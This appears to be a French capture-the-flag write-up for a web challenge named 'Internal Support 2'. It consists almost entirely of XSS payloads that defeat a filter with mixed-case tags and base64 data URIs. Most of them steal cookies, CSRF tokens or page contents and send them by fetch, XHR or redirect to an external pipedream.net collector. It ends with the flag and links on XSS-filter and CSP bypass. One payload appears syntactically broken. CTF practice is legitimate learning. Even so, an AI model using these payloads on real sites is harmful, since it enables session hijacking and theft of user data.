#  Internal Support 2

> Categorie(s): `web`

![Consigne](img/consigne.png)

Pour bypass le filtre XSS:

```html
<ScRipT>fetch('http://internalsupport22.chall.malicecyber.com/').then(res => res.text()).then(txt => fetch('https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/', { method: 'POST', body: JSON.stringify({data: btoa(txt)})}))</sCriPt>
```

```html
<ScRipT>window.location = "https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/cookie=" + btoa(document.cookie) + "&csrf-token=" + document.querySelector('#csrf_token').value</sCriPt>
```

```html
<ScRipT>window.onload = () => { const token = window.document.querySelector('#csrf_token').value || ''; window.location = "https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/?cookie=" + btoa(document.cookie) + "&csrf-token=" + token}</sCriPt>
```

```html
<ObJecT data="data:text/html;base64,ZmV0Y2goJ2h0dHA6Ly9pbnRlcm5hbHN1cHBvcnQyMi5jaGFsbC5tYWxpY2VjeWJlci5jb20vJykudGhlbihyZXMgPT4gcmVzLnRleHQoKSkudGhlbih0eHQgPT4gZmV0Y2goJ2h0dHBzOi8vOTMwNDUzNGM0N2Y4NmZmMjdjOWQzZWNkOTJjZTgyYWUubS5waXBlZHJlYW0ubmV0LycsIHsgbWV0aG9kOiAnUE9TVCcsIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtkYXRhOiBidG9hKHR4dCl9KX0pKQ=="></oBjEct>
```
```html
<ObJecT data="data:text/html;base64,PFNjUmlwVD5mZXRjaCgnaHR0cDovL2ludGVybmFsc3VwcG9ydDIyLmNoYWxsLm1hbGljZWN5YmVyLmNvbS8nKS50aGVuKHJlcyA9PiByZXMudGV4dCgpKS50aGVuKHR4dCA9PiBmZXRjaCgnaHR0cHM6Ly85MzA0NTM0YzQ3Zjg2ZmYyN2M5ZDNlY2Q5MmNlODJhZS5tLnBpcGVkcmVhbS5uZXQvJywgeyBtZXRob2Q6ICdQT1NUJywgYm9keTogSlNPTi5zdHJpbmdpZnkoe2RhdGE6IGJ0b2EodHh0KX0pfSkpPC9zQ3JpUHQ+"></oBjEct>
```

```html
<ScRipT>window.location = 'https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/?src=' btoa(<iframe width=900 height=900 src="http://internalsupport22.chall.malicecyber.com/"></iframe>)</sCriPt>
```

```html
<IfRame sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<ScRipT>fetch("http://internalsupport22.chall.malicecyber.com/").then(res => res.text()).then(txt => fetch("https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/", { method: "POST", body: JSON.stringify({data: btoa(txt)})}))</sCriPt>'></iFraMe>
```

____

```html
<ScRipT> fetch('/').then(res => res.text()).then(txt => fetch(window.location.pathname, { method: 'POST', body: JSON.stringify({response: btoa(txt)})}))</sCriPt>
```

```html
<ScRipT>fetch('/').then(res => res.text()).then(txt => {document.querySelector("[name=response]").value = btoa(txt); document.querySelector('form').submit()})</sCriPt>
```

```html
<ScRipT>
    window.onload = () => {
        const req = new XMLHttpRequest();
        req.open('GET', '/', false);
        req.send(null);
        const res = btoa(req.response);
        try {
            document.querySelector("[name=response]").value = btoa(res); document.querySelector('form').submit();
        } catch (error) {
            window.location = "https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/?res=" + res;
        }
    }
</sCriPt>
```

____

```html
<ScRipT>
const req = new XMLHttpRequest();
req.open('GET', '/', false); req.send(null);
const res =req.response;

const xhr = new XMLHttpRequest();
xhr.open("POST", "https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.send(res);
</sCriPt>
```

```html
<ScRipT>
fetch('/', { credentials: "include" })
    .then(res => res.text())
    .then(res =>
        fetch('https://9304534c47f86ff27c9d3ecd92ce82ae.m.pipedream.net/', { 
            method: 'POST',
            credentials: "include",
            body: JSON.stringify({flag: res})
        })
    )
</sCriPt>
```

flag: `BEtter_BUT_ST!LL_N0tttttttttt++Prfct!`

## Liens utiles

- [Advanced Techniques to Bypass & Defeat XSS Filters, Part 1](https://null-byte.wonderhowto.com/how-to/advanced-techniques-bypass-defeat-xss-filters-part-1-0190257/)
- [](https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)